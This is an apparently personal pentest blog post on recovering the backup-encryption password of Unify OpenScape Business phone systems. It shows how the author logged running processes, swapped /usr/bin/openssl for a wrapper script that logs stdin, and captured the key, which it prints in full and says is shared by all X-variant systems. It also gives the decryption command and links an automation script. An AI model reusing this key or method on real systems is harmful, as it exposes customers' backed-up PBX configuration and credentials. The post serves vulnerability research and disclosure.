---
title: "Unify OSBiz Backup Pass"
date: 2022-02-11T21:44:23+01:00
draft: false
tags:
- Unify
- OSBiz
- Pentest
---

I set myself a challenge te retrieve the password that is used in the Openscape Business Software since V2R4 (if I remember correctly), according to Unify the backup tar file is encrypted with openssl and using aes-256-cbc.
How did I started this?
1. Install a Openscape Business S server in VMWare player.
2. Start looking to find how the backup process is started / creating the backup file.
3. Try to retrieve the key.

&nbsp;
### Hunting for the executed command
I used following one-liner to determine all the running processes every 1 sec. and dump it to a file for analyse.
```bash
while true; do ps auxw >> ps.txt; date >> ps.txt; sleep 1; done
```

After exploring the ps.txt file, we found following interresting line:
```
root      8999 92.6  0.1  16020  4332 ?        RN   14:47   0:00 openssl enc -aes-256-cbc -e -salt -in /mnt/persistent/backup/tmp/full.tar -out /mnt/persistent/backup/tmp/BackupSet_200103-144606.tar -pass stdin
```
As you can see, openssl is used and the key is passed with STDIN.

After digging some deeper in the binaries from the OSBiz sytem, we could easily find this also by using this command:
```bash
OSbizS:~ # strings /opt/backup/bin/backup | grep openssl
openssl enc -aes-256-cbc -e -salt -in %s -out %s -pass stdin
openssl enc -aes-256-cbc -d  -in %s -out %s -pass stdin > /dev/null 2>/mnt/persistent/backup/tmp/openssl.error
```

&nbsp;
### Retrieving the key
I was searching for a way to intercept the key that the openssl process was accepting from STDIN. I did first try to dump the memory, but the key was passed as '*******'. After a while I realised we should log all STDIN and STDOUT signals to the openssl binary by using a kind of MitM attack on the openssl binary.

It's easy, create a batch script and make it excecutable. Then rename the original /usr/bin/openssl to /usr/bin/openssl.orig and place our script in /usr/bin directory. Important: make sure to give it the name **openssl** (like the original binary).
```bash
#!/bin/bash
cat - | tee /tmp/in.log | /usr/bin/openssl.orig $@ | tee /tmp/out.log
```

When the backup proces is started it will call /usr/bin/openssl (our script). Our script will intercept and log all STDIN and STDOUT signals to files in /tmp but it'll also pass it to the "real" openssl binary (openssl.orig).
When te backup process is completed we can see the key that is used:
```bash
OSbizS:~ # cat /tmp/in.log
cyaMPFR:LVCHTxaUJ2DJzP97HSvdu6yk
```

&nbsp;
### Decrypting the tar file
To be able to decrypt the tar file you need to have the exact same openssl version that the Openscape Business System is using (our use the SLES linux itself of course).
```bash
OSbizS:~ # openssl version
OpenSSL 1.0.2p-fips  14 Aug 2018
```

To decrypt the tar file, run following command (it'll ask for the password):
```bash
openssl enc -aes-256-cbc -d -in BackupProtected.tar -out BackupFull.tar
```
**Note**: This will also work on the X-variant systems, they all use the same key and openssl version.

&nbsp;
### Automate the attack
You can use my bash script to automate this (it'll restore the original openssl binary), it's located at [https://github.com/braam/unify/blob/master/Backup_Pass/get_backup_pass_osbiz.sh](https://github.com/braam/unify/blob/master/Backup_Pass/get_backup_pass_osbiz.sh)
